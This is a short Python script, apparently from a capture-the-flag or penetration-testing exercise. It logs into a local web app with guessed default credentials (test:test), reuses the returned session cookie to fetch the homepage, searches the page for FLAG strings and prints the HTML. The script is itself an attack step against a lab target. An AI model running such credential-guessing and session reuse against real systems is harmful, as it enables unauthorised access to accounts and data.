import requests
import re

print("[*] Attempting authentication with discovered credentials: test:test\n")

# Try the discovered credentials
data = {"username": "test", "password": "test"}
login_resp = requests.post("http://127.0.0.1:33198/login", data=data, allow_redirects=False)

print(f"Login POST status: {login_resp.status_code}")
print(f"Response headers: {dict(login_resp.headers)}")
print(f"Cookies: {dict(login_resp.cookies)}")
print()

# Extract session cookie if login was successful
if login_resp.cookies and 'session' in login_resp.cookies:
    test_session = login_resp.cookies['session']
    print(f"[!] New session cookie: {test_session}")
    
    # Now use this session to access the site
    headers = {'Cookie': f'session={test_session}'}
    home_resp = requests.get('http://127.0.0.1:33198/', headers=headers, timeout=5)
    print(f"\nHomepage with test session: Status {home_resp.status_code}")
    print(f"Response length: {len(home_resp.text)}B")
    
    # Look for flags or sensitive data
    flag_matches = re.findall(r'FLAG\{[^}]+\}', home_resp.text)
    if flag_matches:
        print(f"\n[!] FLAGS FOUND: {flag_matches}")
    
    # Print full HTML to see what the test account can access
    print("\n" + "="*80)
    print("Full HTML response with test account:")
    print("="*80)
    print(home_resp.text)
    
else:
    print("[!] No session cookie received - login may have failed")
    print(f"Response body: {login_resp.text[:500]}")
